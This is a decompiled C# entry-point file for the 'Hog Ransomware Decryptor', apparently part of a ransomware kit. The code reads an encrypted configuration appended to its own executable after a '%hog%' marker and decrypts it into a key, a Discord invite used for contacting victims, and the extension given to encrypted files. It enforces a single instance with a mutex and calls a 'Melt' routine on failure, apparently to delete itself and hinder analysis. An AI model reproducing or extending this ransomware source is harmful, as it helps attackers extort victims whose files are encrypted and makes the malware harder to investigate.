using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace HogRansomwareDecryptor
{
	// Token: 0x02000004 RID: 4
	internal static class Program
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002B84 File Offset: 0x00000D84
		[STAThread]
		private static void Main()
		{
			try
			{
				using (StreamReader streamReader = new StreamReader(Assembly.GetEntryAssembly().Location))
				{
					using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
					{
						byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
						string text = Encoding.ASCII.GetString(bytes).Substring(Encoding.ASCII.GetString(bytes).IndexOf("%hog%")).Replace("%hog%", "");
						text = Utils.Decrypt(text);
						Settings.Key = text.Split(new char[]
						{
							'%'
						})[0];
						Settings.DiscordInvite = text.Split(new char[]
						{
							'%'
						})[1];
						Settings.Extension = text.Split(new char[]
						{
							'%'
						})[2];
						using (Mutex mutex = new Mutex(false, Program.mt))
						{
							if (!mutex.WaitOne(0, false))
							{
								MessageBox.Show("Already running!", "Hog Ransomware Decryptor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							}
							else
							{
								Application.EnableVisualStyles();
								Application.SetCompatibleTextRenderingDefault(false);
								Application.Run(new Main());
							}
						}
					}
				}
			}
			catch
			{
				Utils.Melt();
			}
		}

		// Token: 0x0400000E RID: 14
		internal static string mt = "6950448537301897-Hog-6950448537301897";
	}
}
